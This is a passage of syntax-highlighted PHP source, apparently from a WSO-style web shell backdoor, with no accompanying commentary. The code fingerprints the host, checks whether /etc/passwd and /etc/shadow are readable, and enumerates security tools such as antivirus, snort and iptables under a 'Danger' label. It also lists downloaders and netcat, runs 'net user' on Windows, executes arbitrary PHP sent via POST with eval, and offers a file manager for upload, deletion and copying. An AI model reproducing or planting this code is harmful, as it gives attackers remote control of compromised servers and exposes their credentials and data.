<span class="lineno"> 399</span>     <span class="k">if</span><span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;mssql_connect&#39;</span><span class="p">))</span> 
<span class="lineno"> 400</span>         <span class="nv">$temp</span><span class="p">[]</span> <span class="o">=</span> <span class="s2">&quot;MSSQL&quot;</span><span class="p">;</span> 
<span class="lineno"> 401</span>     <span class="k">if</span><span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;pg_connect&#39;</span><span class="p">))</span> 
<span class="lineno"> 402</span>         <span class="nv">$temp</span><span class="p">[]</span> <span class="o">=</span> <span class="s2">&quot;PostgreSQL&quot;</span><span class="p">;</span> 
<span class="lineno"> 403</span>     <span class="k">if</span><span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;oci_connect&#39;</span><span class="p">))</span> 
<span class="lineno"> 404</span>         <span class="nv">$temp</span><span class="p">[]</span> <span class="o">=</span> <span class="s2">&quot;Oracle&quot;</span><span class="p">;</span> 
<span class="lineno"> 405</span>     <span class="nx">showSecParam</span><span class="p">(</span><span class="s1">&#39;Supported databases&#39;</span><span class="p">,</span> <span class="nb">implode</span><span class="p">(</span><span class="s1">&#39;, &#39;</span><span class="p">,</span> <span class="nv">$temp</span><span class="p">));</span> 
<span class="lineno"> 406</span>     <span class="k">echo</span> <span class="s1">&#39;&lt;br&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 407</span>      
<span class="lineno"> 408</span>     <span class="k">if</span><span class="p">(</span> <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;os&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;nix&#39;</span> <span class="p">)</span> <span class="p">{</span> 
<span class="lineno"> 409</span>         <span class="nv">$userful</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;gcc&#39;</span><span class="p">,</span><span class="s1">&#39;lcc&#39;</span><span class="p">,</span><span class="s1">&#39;cc&#39;</span><span class="p">,</span><span class="s1">&#39;ld&#39;</span><span class="p">,</span><span class="s1">&#39;make&#39;</span><span class="p">,</span><span class="s1">&#39;php&#39;</span><span class="p">,</span><span class="s1">&#39;perl&#39;</span><span class="p">,</span><span class="s1">&#39;python&#39;</span><span class="p">,</span><span class="s1">&#39;ruby&#39;</span><span class="p">,</span><span class="s1">&#39;tar&#39;</span><span class="p">,</span><span class="s1">&#39;gzip&#39;</span><span class="p">,</span><span class="s1">&#39;bzip&#39;</span><span class="p">,</span><span class="s1">&#39;bzip2&#39;</span><span class="p">,</span><span class="s1">&#39;nc&#39;</span><span class="p">,</span><span class="s1">&#39;locate&#39;</span><span class="p">,</span><span class="s1">&#39;suidperl&#39;</span><span class="p">);</span> 
<span class="lineno"> 410</span>         <span class="nv">$danger</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;kav&#39;</span><span class="p">,</span><span class="s1">&#39;nod32&#39;</span><span class="p">,</span><span class="s1">&#39;bdcored&#39;</span><span class="p">,</span><span class="s1">&#39;uvscan&#39;</span><span class="p">,</span><span class="s1">&#39;sav&#39;</span><span class="p">,</span><span class="s1">&#39;drwebd&#39;</span><span class="p">,</span><span class="s1">&#39;clamd&#39;</span><span class="p">,</span><span class="s1">&#39;rkhunter&#39;</span><span class="p">,</span><span class="s1">&#39;chkrootkit&#39;</span><span class="p">,</span><span class="s1">&#39;iptables&#39;</span><span class="p">,</span><span class="s1">&#39;ipfw&#39;</span><span class="p">,</span><span class="s1">&#39;tripwire&#39;</span><span class="p">,</span><span class="s1">&#39;shieldcc&#39;</span><span class="p">,</span><span class="s1">&#39;portsentry&#39;</span><span class="p">,</span><span class="s1">&#39;snort&#39;</span><span class="p">,</span><span class="s1">&#39;ossec&#39;</span><span class="p">,</span><span class="s1">&#39;lidsadm&#39;</span><span class="p">,</span><span class="s1">&#39;tcplodg&#39;</span><span class="p">,</span><span class="s1">&#39;sxid&#39;</span><span class="p">,</span><span class="s1">&#39;logcheck&#39;</span><span class="p">,</span><span class="s1">&#39;logwatch&#39;</span><span class="p">,</span><span class="s1">&#39;sysmask&#39;</span><span class="p">,</span><span class="s1">&#39;zmbscap&#39;</span><span class="p">,</span><span class="s1">&#39;sawmill&#39;</span><span class="p">,</span><span class="s1">&#39;wormscan&#39;</span><span class="p">,</span><span class="s1">&#39;ninja&#39;</span><span class="p">);</span> 
<span class="lineno"> 411</span>         <span class="nv">$downloaders</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;wget&#39;</span><span class="p">,</span><span class="s1">&#39;fetch&#39;</span><span class="p">,</span><span class="s1">&#39;lynx&#39;</span><span class="p">,</span><span class="s1">&#39;links&#39;</span><span class="p">,</span><span class="s1">&#39;curl&#39;</span><span class="p">,</span><span class="s1">&#39;get&#39;</span><span class="p">,</span><span class="s1">&#39;lwp-mirror&#39;</span><span class="p">);</span> 
<span class="lineno"> 412</span>         <span class="nx">showSecParam</span><span class="p">(</span><span class="s1">&#39;Readable /etc/passwd&#39;</span><span class="p">,</span> <span class="o">@</span><span class="nb">is_readable</span><span class="p">(</span><span class="s1">&#39;/etc/passwd&#39;</span><span class="p">)</span><span class="o">?</span><span class="s2">&quot;yes &lt;a href=&#39;#&#39; onclick=&#39;g(</span><span class="se">\&quot;</span><span class="s2">FilesTools</span><span class="se">\&quot;</span><span class="s2">, </span><span class="se">\&quot;</span><span class="s2">/etc/</span><span class="se">\&quot;</span><span class="s2">, </span><span class="se">\&quot;</span><span class="s2">passwd</span><span class="se">\&quot;</span><span class="s2">)&#39;&gt;[view]&lt;/a&gt;&quot;</span><span class="o">:</span><span class="s1">&#39;no&#39;</span><span class="p">);</span> 
<span class="lineno"> 413</span>         <span class="nx">showSecParam</span><span class="p">(</span><span class="s1">&#39;Readable /etc/shadow&#39;</span><span class="p">,</span> <span class="o">@</span><span class="nb">is_readable</span><span class="p">(</span><span class="s1">&#39;/etc/shadow&#39;</span><span class="p">)</span><span class="o">?</span><span class="s2">&quot;yes &lt;a href=&#39;#&#39; onclick=&#39;g(</span><span class="se">\&quot;</span><span class="s2">FilesTools</span><span class="se">\&quot;</span><span class="s2">, </span><span class="se">\&quot;</span><span class="s2">etc</span><span class="se">\&quot;</span><span class="s2">, </span><span class="se">\&quot;</span><span class="s2">shadow</span><span class="se">\&quot;</span><span class="s2">)&#39;&gt;[view]&lt;/a&gt;&quot;</span><span class="o">:</span><span class="s1">&#39;no&#39;</span><span class="p">);</span> 
<span class="lineno"> 414</span>         <span class="nx">showSecParam</span><span class="p">(</span><span class="s1">&#39;OS version&#39;</span><span class="p">,</span> <span class="o">@</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="s1">&#39;/proc/version&#39;</span><span class="p">));</span> 
<span class="lineno"> 415</span>         <span class="nx">showSecParam</span><span class="p">(</span><span class="s1">&#39;Distr name&#39;</span><span class="p">,</span> <span class="o">@</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="s1">&#39;/etc/issue.net&#39;</span><span class="p">));</span> 
<span class="lineno"> 416</span>         <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;safe_mode&#39;</span><span class="p">])</span> <span class="p">{</span> 
<span class="lineno"> 417</span>             <span class="k">echo</span> <span class="s1">&#39;&lt;br&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 418</span>             <span class="nv">$temp</span><span class="o">=</span><span class="k">array</span><span class="p">();</span> 
<span class="lineno"> 419</span>             <span class="k">foreach</span> <span class="p">(</span><span class="nv">$userful</span> <span class="k">as</span> <span class="nv">$item</span><span class="p">)</span> 
<span class="lineno"> 420</span>                 <span class="k">if</span><span class="p">(</span><span class="nx">which</span><span class="p">(</span><span class="nv">$item</span><span class="p">)){</span><span class="nv">$temp</span><span class="p">[]</span><span class="o">=</span><span class="nv">$item</span><span class="p">;}</span> 
<span class="lineno"> 421</span>             <span class="nx">showSecParam</span><span class="p">(</span><span class="s1">&#39;Userful&#39;</span><span class="p">,</span> <span class="nb">implode</span><span class="p">(</span><span class="s1">&#39;, &#39;</span><span class="p">,</span><span class="nv">$temp</span><span class="p">));</span> 
<span class="lineno"> 422</span>             <span class="nv">$temp</span><span class="o">=</span><span class="k">array</span><span class="p">();</span> 
<span class="lineno"> 423</span>             <span class="k">foreach</span> <span class="p">(</span><span class="nv">$danger</span> <span class="k">as</span> <span class="nv">$item</span><span class="p">)</span> 
<span class="lineno"> 424</span>                 <span class="k">if</span><span class="p">(</span><span class="nx">which</span><span class="p">(</span><span class="nv">$item</span><span class="p">)){</span><span class="nv">$temp</span><span class="p">[]</span><span class="o">=</span><span class="nv">$item</span><span class="p">;}</span> 
<span class="lineno"> 425</span>             <span class="nx">showSecParam</span><span class="p">(</span><span class="s1">&#39;Danger&#39;</span><span class="p">,</span> <span class="nb">implode</span><span class="p">(</span><span class="s1">&#39;, &#39;</span><span class="p">,</span><span class="nv">$temp</span><span class="p">));</span> 
<span class="lineno"> 426</span>             <span class="nv">$temp</span><span class="o">=</span><span class="k">array</span><span class="p">();</span> 
<span class="lineno"> 427</span>             <span class="k">foreach</span> <span class="p">(</span><span class="nv">$downloaders</span> <span class="k">as</span> <span class="nv">$item</span><span class="p">)</span>  
<span class="lineno"> 428</span>                 <span class="k">if</span><span class="p">(</span><span class="nx">which</span><span class="p">(</span><span class="nv">$item</span><span class="p">)){</span><span class="nv">$temp</span><span class="p">[]</span><span class="o">=</span><span class="nv">$item</span><span class="p">;}</span> 
<span class="lineno"> 429</span>             <span class="nx">showSecParam</span><span class="p">(</span><span class="s1">&#39;Downloaders&#39;</span><span class="p">,</span> <span class="nb">implode</span><span class="p">(</span><span class="s1">&#39;, &#39;</span><span class="p">,</span><span class="nv">$temp</span><span class="p">));</span> 
<span class="lineno"> 430</span>             <span class="k">echo</span> <span class="s1">&#39;&lt;br/&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 431</span>             <span class="nx">showSecParam</span><span class="p">(</span><span class="s1">&#39;Hosts&#39;</span><span class="p">,</span> <span class="o">@</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="s1">&#39;/etc/hosts&#39;</span><span class="p">));</span> 
<span class="lineno"> 432</span>             <span class="nx">showSecParam</span><span class="p">(</span><span class="s1">&#39;HDD space&#39;</span><span class="p">,</span> <span class="nx">ex</span><span class="p">(</span><span class="s1">&#39;df -h&#39;</span><span class="p">));</span> 
<span class="lineno"> 433</span>             <span class="nx">showSecParam</span><span class="p">(</span><span class="s1">&#39;Mount options&#39;</span><span class="p">,</span> <span class="o">@</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="s1">&#39;/etc/fstab&#39;</span><span class="p">));</span> 
<span class="lineno"> 434</span>         <span class="p">}</span> 
<span class="lineno"> 435</span>     <span class="p">}</span> <span class="k">else</span> <span class="p">{</span> 
<span class="lineno"> 436</span>         <span class="nx">showSecParam</span><span class="p">(</span><span class="s1">&#39;OS Version&#39;</span><span class="p">,</span><span class="nx">ex</span><span class="p">(</span><span class="s1">&#39;ver&#39;</span><span class="p">));</span>  
<span class="lineno"> 437</span>         <span class="nx">showSecParam</span><span class="p">(</span><span class="s1">&#39;Account Settings&#39;</span><span class="p">,</span><span class="nx">ex</span><span class="p">(</span><span class="s1">&#39;net accounts&#39;</span><span class="p">));</span>  
<span class="lineno"> 438</span>         <span class="nx">showSecParam</span><span class="p">(</span><span class="s1">&#39;User Accounts&#39;</span><span class="p">,</span><span class="nx">ex</span><span class="p">(</span><span class="s1">&#39;net user&#39;</span><span class="p">));</span> 
<span class="lineno"> 439</span>     <span class="p">}</span> 
<span class="lineno"> 440</span>     <span class="k">echo</span> <span class="s1">&#39;&lt;/div&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 441</span>     <span class="nx">printFooter</span><span class="p">();</span> 
<span class="lineno"> 442</span> <span class="p">}</span> 
<span class="lineno"> 443</span> 
<span class="lineno"> 444</span> <span class="k">function</span> <span class="nf">actionPhp</span><span class="p">()</span> <span class="p">{</span> 
<span class="lineno"> 445</span>     <span class="k">if</span><span class="p">(</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;ajax&#39;</span><span class="p">])</span> <span class="p">)</span> <span class="p">{</span> 
<span class="lineno"> 446</span>         <span class="nv">$_SESSION</span><span class="p">[</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_HOST&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;ajax&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span> 
<span class="lineno"> 447</span>         <span class="nb">ob_start</span><span class="p">();</span> 
<span class="lineno"> 448</span>         <span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]);</span> 
<span class="lineno"> 449</span>         <span class="nv">$temp</span> <span class="o">=</span> <span class="s2">&quot;document.getElementById(&#39;PhpOutput&#39;).style.display=&#39;&#39;;document.getElementById(&#39;PhpOutput&#39;).innerHTML=&#39;&quot;</span><span class="o">.</span><span class="nb">addcslashes</span><span class="p">(</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nb">ob_get_clean</span><span class="p">()),</span><span class="s2">&quot;</span><span class="se">\n\r\t\\</span><span class="s2">&#39;&amp;#92;&amp;#48;&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span> 
<span class="lineno"> 450</span>         <span class="k">echo</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$temp</span><span class="p">),</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span> <span class="nv">$temp</span><span class="p">;</span> 
<span class="lineno"> 451</span>         <span class="k">exit</span><span class="p">;</span>  
<span class="lineno"> 452</span>     <span class="p">}</span> 
<span class="lineno"> 453</span>     <span class="nx">printHeader</span><span class="p">();</span> 
<span class="lineno"> 454</span>     <span class="k">if</span><span class="p">(</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;info&#39;</span><span class="p">)</span> <span class="p">)</span> <span class="p">{</span> 
<span class="lineno"> 455</span>         <span class="k">echo</span> <span class="s1">&#39;&lt;h1&gt;PHP info&lt;/h1&gt;&lt;div class=content&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 456</span>         <span class="nb">ob_start</span><span class="p">();</span> 
<span class="lineno"> 457</span>         <span class="nb">phpinfo</span><span class="p">();</span> 
<span class="lineno"> 458</span>         <span class="nv">$tmp</span> <span class="o">=</span> <span class="nb">ob_get_clean</span><span class="p">();</span> 
<span class="lineno"> 459</span>         <span class="nv">$tmp</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s1">&#39;!body {.*}!msiU&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="nv">$tmp</span><span class="p">);</span> 
<span class="lineno"> 460</span>         <span class="nv">$tmp</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s1">&#39;!a:\w+ {.*}!msiU&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="nv">$tmp</span><span class="p">);</span> 
<span class="lineno"> 461</span>         <span class="nv">$tmp</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s1">&#39;!h1!msiU&#39;</span><span class="p">,</span><span class="s1">&#39;h2&#39;</span><span class="p">,</span><span class="nv">$tmp</span><span class="p">);</span> 
<span class="lineno"> 462</span>         <span class="nv">$tmp</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s1">&#39;!td, th {(.*)}!msiU&#39;</span><span class="p">,</span><span class="s1">&#39;.e, .v, .h, .h th {$1}&#39;</span><span class="p">,</span><span class="nv">$tmp</span><span class="p">);</span> 
<span class="lineno"> 463</span>         <span class="nv">$tmp</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s1">&#39;!body, td, th, h2, h2 {.*}!msiU&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="nv">$tmp</span><span class="p">);</span> 
<span class="lineno"> 464</span>         <span class="k">echo</span> <span class="nv">$tmp</span><span class="p">;</span> 
<span class="lineno"> 465</span>         <span class="k">echo</span> <span class="s1">&#39;&lt;/div&gt;&lt;br&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 466</span>     <span class="p">}</span> 
<span class="lineno"> 467</span>     <span class="k">if</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;ajax&#39;</span><span class="p">])</span><span class="o">&amp;&amp;!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span> 
<span class="lineno"> 468</span>         <span class="nv">$_SESSION</span><span class="p">[</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_HOST&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;ajax&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span> 
<span class="lineno"> 469</span>         <span class="k">echo</span> <span class="s1">&#39;&lt;h1&gt;Execution PHP-code&lt;/h1&gt;&lt;div class=content&gt;&lt;form name=pf method=post onsubmit=&quot;if(this.ajax.checked){a(null,null,this.code.value);}else{g(null,null,this.code.value,\&#39;\&#39;);}return false;&quot;&gt;&lt;textarea name=code class=bigarea id=PhpCode&gt;&#39;</span><span class="o">.</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])</span><span class="o">?</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])</span><span class="o">:</span><span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&lt;/textarea&gt;&lt;input type=submit value=Eval style=&quot;margin-top:5px&quot;&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 470</span>     <span class="k">echo</span> <span class="s1">&#39; &lt;input type=checkbox name=ajax value=1 &#39;</span><span class="o">.</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_HOST&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;ajax&#39;</span><span class="p">]</span><span class="o">?</span><span class="s1">&#39;checked&#39;</span><span class="o">:</span><span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&gt; send using AJAX&lt;/form&gt;&lt;pre id=PhpOutput style=&quot;&#39;</span><span class="o">.</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])</span><span class="o">?</span><span class="s1">&#39;display:none;&#39;</span><span class="o">:</span><span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;margin-top:5px;&quot; class=ml1&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 471</span>     <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span> <span class="p">{</span> 
<span class="lineno"> 472</span>         <span class="nb">ob_start</span><span class="p">();</span> 
<span class="lineno"> 473</span>         <span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]);</span> 
<span class="lineno"> 474</span>         <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nb">ob_get_clean</span><span class="p">());</span> 
<span class="lineno"> 475</span>     <span class="p">}</span> 
<span class="lineno"> 476</span>     <span class="k">echo</span> <span class="s1">&#39;&lt;/pre&gt;&lt;/div&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 477</span>     <span class="nx">printFooter</span><span class="p">();</span> 
<span class="lineno"> 478</span> <span class="p">}</span> 
<span class="lineno"> 479</span> 
<span class="lineno"> 480</span> <span class="k">function</span> <span class="nf">actionFilesMan</span><span class="p">()</span> <span class="p">{</span> 
<span class="lineno"> 481</span>     <span class="nx">printHeader</span><span class="p">();</span> 
<span class="lineno"> 482</span>     <span class="k">echo</span> <span class="s1">&#39;&lt;h1&gt;File manager&lt;/h1&gt;&lt;div class=content&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 483</span>     <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span> <span class="p">{</span> 
<span class="lineno"> 484</span>         <span class="k">switch</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])</span> <span class="p">{</span> 
<span class="lineno"> 485</span>             <span class="k">case</span> <span class="s1">&#39;uploadFile&#39;</span><span class="o">:</span> 
<span class="lineno"> 486</span>                 <span class="k">if</span><span class="p">(</span><span class="o">!@</span><span class="nb">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">],</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">]))</span> 
<span class="lineno"> 487</span>                     <span class="k">echo</span> <span class="s2">&quot;Can&#39;t upload file!&quot;</span><span class="p">;</span> 
<span class="lineno"> 488</span>                 <span class="k">break</span><span class="p">;</span> 
<span class="lineno"> 489</span>                 <span class="k">break</span><span class="p">;</span> 
<span class="lineno"> 490</span>             <span class="k">case</span> <span class="s1">&#39;mkdir&#39;</span><span class="o">:</span> 
<span class="lineno"> 491</span>                 <span class="k">if</span><span class="p">(</span><span class="o">!@</span><span class="nb">mkdir</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]))</span> 
<span class="lineno"> 492</span>                     <span class="k">echo</span> <span class="s2">&quot;Can&#39;t create new dir&quot;</span><span class="p">;</span> 
<span class="lineno"> 493</span>                 <span class="k">break</span><span class="p">;</span> 
<span class="lineno"> 494</span>             <span class="k">case</span> <span class="s1">&#39;delete&#39;</span><span class="o">:</span> 
<span class="lineno"> 495</span>                 <span class="k">function</span> <span class="nf">deleteDir</span><span class="p">(</span><span class="nv">$path</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno"> 496</span>                     <span class="nv">$path</span> <span class="o">=</span> <span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$path</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">==</span><span class="s1">&#39;/&#39;</span><span class="p">)</span> <span class="o">?</span> <span class="nv">$path</span><span class="o">:</span><span class="nv">$path</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="p">;</span> 
<span class="lineno"> 497</span>                     <span class="nv">$dh</span>  <span class="o">=</span> <span class="nb">opendir</span><span class="p">(</span><span class="nv">$path</span><span class="p">);</span> 
<span class="lineno"> 498</span>                     <span class="k">while</span> <span class="p">(</span> <span class="p">(</span><span class="nv">$item</span> <span class="o">=</span> <span class="nb">readdir</span><span class="p">(</span><span class="nv">$dh</span><span class="p">)</span> <span class="p">)</span> <span class="o">!==</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno"> 499</span>                         <span class="nv">$item</span> <span class="o">=</span> <span class="nv">$path</span><span class="o">.</span><span class="nv">$item</span><span class="p">;</span> 
<span class="lineno"> 500</span>                         <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="nb">basename</span><span class="p">(</span><span class="nv">$item</span><span class="p">)</span> <span class="o">==</span> <span class="s2">&quot;..&quot;</span><span class="p">)</span> <span class="o">||</span> <span class="p">(</span><span class="nb">basename</span><span class="p">(</span><span class="nv">$item</span><span class="p">)</span> <span class="o">==</span> <span class="s2">&quot;.&quot;</span><span class="p">)</span> <span class="p">)</span> 
<span class="lineno"> 501</span>                             <span class="k">continue</span><span class="p">;</span> 
<span class="lineno"> 502</span>                         <span class="nv">$type</span> <span class="o">=</span> <span class="nb">filetype</span><span class="p">(</span><span class="nv">$item</span><span class="p">);</span> 
<span class="lineno"> 503</span>                         <span class="k">if</span> <span class="p">(</span><span class="nv">$type</span> <span class="o">==</span> <span class="s2">&quot;dir&quot;</span><span class="p">)</span> 
<span class="lineno"> 504</span>                             <span class="nx">deleteDir</span><span class="p">(</span><span class="nv">$item</span><span class="p">);</span> 
<span class="lineno"> 505</span>                         <span class="k">else</span> 
<span class="lineno"> 506</span>                             <span class="o">@</span><span class="nb">unlink</span><span class="p">(</span><span class="nv">$item</span><span class="p">);</span> 
<span class="lineno"> 507</span>                     <span class="p">}</span> 
<span class="lineno"> 508</span>                     <span class="nb">closedir</span><span class="p">(</span><span class="nv">$dh</span><span class="p">);</span> 
<span class="lineno"> 509</span>                     <span class="nb">rmdir</span><span class="p">(</span><span class="nv">$path</span><span class="p">);</span> 
<span class="lineno"> 510</span>                 <span class="p">}</span> 
<span class="lineno"> 511</span>                 <span class="k">if</span><span class="p">(</span><span class="nb">is_array</span><span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">]))</span> 
<span class="lineno"> 512</span>                     <span class="k">foreach</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$f</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno"> 513</span>                         <span class="nv">$f</span> <span class="o">=</span> <span class="nb">urldecode</span><span class="p">(</span><span class="nv">$f</span><span class="p">);</span> 
<span class="lineno"> 514</span>                         <span class="k">if</span><span class="p">(</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$f</span><span class="p">))</span> 
<span class="lineno"> 515</span>                             <span class="nx">deleteDir</span><span class="p">(</span><span class="nv">$f</span><span class="p">);</span> 
<span class="lineno"> 516</span>                         <span class="k">else</span> 
<span class="lineno"> 517</span>                             <span class="o">@</span><span class="nb">unlink</span><span class="p">(</span><span class="nv">$f</span><span class="p">);</span> 
<span class="lineno"> 518</span>                     <span class="p">}</span> 
<span class="lineno"> 519</span>                 <span class="k">break</span><span class="p">;</span> 
<span class="lineno"> 520</span>             <span class="k">case</span> <span class="s1">&#39;paste&#39;</span><span class="o">:</span> 
<span class="lineno"> 521</span>                 <span class="k">if</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;act&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;copy&#39;</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno"> 522</span>                     <span class="k">function</span> <span class="nf">copy_paste</span><span class="p">(</span><span class="nv">$c</span><span class="p">,</span><span class="nv">$s</span><span class="p">,</span><span class="nv">$d</span><span class="p">){</span> 
<span class="lineno"> 523</span>                         <span class="k">if</span><span class="p">(</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$c</span><span class="o">.</span><span class="nv">$s</span><span class="p">)){</span> 
<span class="lineno"> 524</span>                             <span class="nb">mkdir</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$s</span><span class="p">);</span> 
<span class="lineno"> 525</span>                             <span class="nv">$h</span> <span class="o">=</span> <span class="nb">opendir</span><span class="p">(</span><span class="nv">$c</span><span class="o">.</span><span class="nv">$s</span><span class="p">);</span> 
<span class="lineno"> 526</span>                             <span class="k">while</span> <span class="p">((</span><span class="nv">$f</span> <span class="o">=</span> <span class="nb">readdir</span><span class="p">(</span><span class="nv">$h</span><span class="p">))</span> <span class="o">!==</span> <span class="k">false</span><span class="p">)</span> 
<span class="lineno"> 527</span>                                 <span class="k">if</span> <span class="p">((</span><span class="nv">$f</span> <span class="o">!=</span> <span class="s2">&quot;.&quot;</span><span class="p">)</span> <span class="k">and</span> <span class="p">(</span><span class="nv">$f</span> <span class="o">!=</span> <span class="s2">&quot;..&quot;</span><span class="p">))</span> <span class="p">{</span> 
<span class="lineno"> 528</span>                                     <span class="nx">copy_paste</span><span class="p">(</span><span class="nv">$c</span><span class="o">.</span><span class="nv">$s</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="p">,</span><span class="nv">$f</span><span class="p">,</span> <span class="nv">$d</span><span class="o">.</span><span class="nv">$s</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="p">);</span> 
<span class="lineno"> 529</span>                                 <span class="p">}</span> 
<span class="lineno"> 530</span>                         <span class="p">}</span> <span class="k">elseif</span><span class="p">(</span><span class="nb">is_file</span><span class="p">(</span><span class="nv">$c</span><span class="o">.</span><span class="nv">$s</span><span class="p">))</span> <span class="p">{</span> 
